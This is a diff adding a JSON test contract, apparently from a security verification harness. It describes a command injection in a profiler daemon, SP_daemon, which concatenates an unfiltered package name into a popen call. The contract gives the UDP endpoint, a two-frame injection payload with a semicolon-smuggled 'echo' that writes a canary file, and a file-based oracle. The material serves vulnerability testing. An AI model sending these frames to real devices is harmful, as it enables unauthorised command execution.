@@ -1,0 +1,68 @@
+{
+  "contract_id": "DP-02",
+  "finding_ids": ["DP-02"],
+  "unit_id": "developtools_profiler_dp02",
+  "vuln_class": "command_injection",
+  "description": "SP_daemon set_pkgName 未过滤分号，popen 拼接命令注入（Network.cpp:153 popen(pidof + dubaiPkgName)）",
+  "entry": {
+    "kind": "hap_udp",
+    "endpoint": "127.0.0.1:8283",
+    "reachability_identity": "hap_app",
+    "evidence": "hap_poc_suite DP-02 manifest（真机复验 4/4，归因隔离：kill SP_daemon → 无 canary；重启 → canary 重现）"
+  },
+  "identity": {
+    "execution_identity": "hap_app",
+    "identity_ladder_fallback": "hap_app",
+    "max_evidence_grade": "A"
+  },
+  "protocol": {
+    "descriptor_id": "sp_daemon_text",
+    "field_values": {
+      "mode": "udp",
+      "host": "127.0.0.1",
+      "port": 8283,
+      "target": "DP-02"
+    },
+    "param_space": {
+      "frame_first_template": "set_pkgName::smartperf;echo \"hack by nju\" > __MARKER_PATH__;#",
+      "frame_second": "catch_network_traffic::x",
+      "note": "frame_first 注入载体（Network.cpp:153 popen 拼接）；frame_second 触发 popen 执行；marker 路径由 runner 注入（run_dir 内，run 唯一可否证）"
+    },
+    "frame_sequence": ["frame_first", "frame_second"],
+    "inter_frame_delay_seconds": 0.3
+  },
+  "fault": {
+    "operator": "payload_value_substitution",
+    "description": "frame_first=set_pkgName::smartperf;<cmd>;#（命令注入载体）；frame_second=catch_network_traffic::x（触发 popen 执行）",
+    "evidence": "SP_daemon Network.cpp:153 popen(\"pidof \" + dubaiPkgName)",
+    "expected_guards": ["udp_token_check"]
+  },
+  "oracle": {
+    "kind": "artifact_differential",
+    "artifact_forms": [
+      {
+        "form": "create",
+        "path": "__MARKER__",
+        "content_contains": "hack by nju",
+        "output_surface": "",
+        "output_is_dir": false
+      }
+    ],
+    "hilog_expectations": [],
+    "pattern_key": "run_pattern",
+    "refutation": ["marker_path_unique_per_run", "baseline_absent"],
+    "evidence": "canary 文件由注入的 shell 命令创建；路径由 field_values.marker 注入 frame_first"
+  },
+  "risk": {
+    "target_process": "SP_daemon",
+    "risk_tier": "user_daemon",
+    "crash_oracle_allowed": true,
+    "restartable": true,
+    "rationale": "SP_daemon 为可重启用户守护进程（实机验证 kill+restart 可行）"
+  },
+  "cleanup": {
+    "remote_paths": [],
+    "restore_actions": [],
+    "verify": []
+  }
+}
